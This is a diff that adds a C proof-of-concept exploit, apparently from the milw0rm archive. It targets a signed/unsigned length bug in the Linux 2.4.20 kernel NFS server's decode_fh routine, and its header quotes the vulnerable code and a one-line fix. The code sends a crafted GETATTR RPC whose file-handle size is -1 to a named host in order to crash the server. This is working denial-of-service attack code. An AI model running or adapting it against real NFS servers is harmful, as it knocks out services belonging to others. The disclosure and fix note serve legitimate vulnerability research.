@@ -1,0 +1,72 @@
+/*
+  Linux 2.4.20 knfsd kernel signed/unsigned decode_fh DoS
+  Author: jared stanbrough <jareds pdx edu> 
+  
+  Vulnerable code: (fs/nfsd/nfs3xdr.c line 52-64)
+
+  static inline u32 *
+  decode_fh(u32 *p, struct svc_fh *fhp)
+  {
+        int size;
+        fh_init(fhp, NFS3_FHSIZE);
+        size = ntohl(*p++);
+        if (size > NFS3_FHSIZE)
+                return NULL;   
+
+        memcpy(&fhp->fh_handle.fh_base, p, size);
+        fhp->fh_handle.fh_size = size;
+        return p + XDR_QUADLEN(size);
+  }
+
+  This code is called by quite a few XDR decoding routines. The below
+  POC demonstrates the vulnerability by encoding a malicious fhsize
+  at the beginning of a diroparg xdr argument. 
+ 
+  To test this, the vulnerable host must have an accessible exported
+  directory which was previously mounted by the attacker. _HOWEVER_ 
+  it may be possible to trigger this bug by some other method.
+
+  Fix: Simply change size to an unsigned int, or check for size < 0.
+*/
+
+#include <rpcsvc/nfs_prot.h>
+#include <rpc/rpc.h>
+#include <rpc/xdr.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+
+#define NFSPROG 100003
+#define NFSVERS 3
+#define NFSPROC_GETATTR 1
+
+static struct diropargs heh;
+
+bool_t xdr_heh(XDR *xdrs, diropargs *heh) 
+{
+  int32_t werd = -1; 
+  return xdr_int32_t(xdrs, &werd);
+}
+
+int main(void)
+{
+  CLIENT * client;
+  struct timeval tv;
+
+  client = clnt_create("marduk", NFSPROG, NFSVERS, "udp");
+  
+  if(client == NULL) {
+      perror("clnt_create\n");
+  }
+
+  tv.tv_sec = 3;
+  tv.tv_usec = 0;
+  client->cl_auth = authunix_create_default();
+
+  clnt_call(client, NFSPROC_GETATTR, (xdrproc_t) xdr_heh, (char *)&heh,
+            (xdrproc_t) xdr_void, NULL, tv);
+
+  return 0;
+}
+
+// milw0rm.com [2003-07-29]
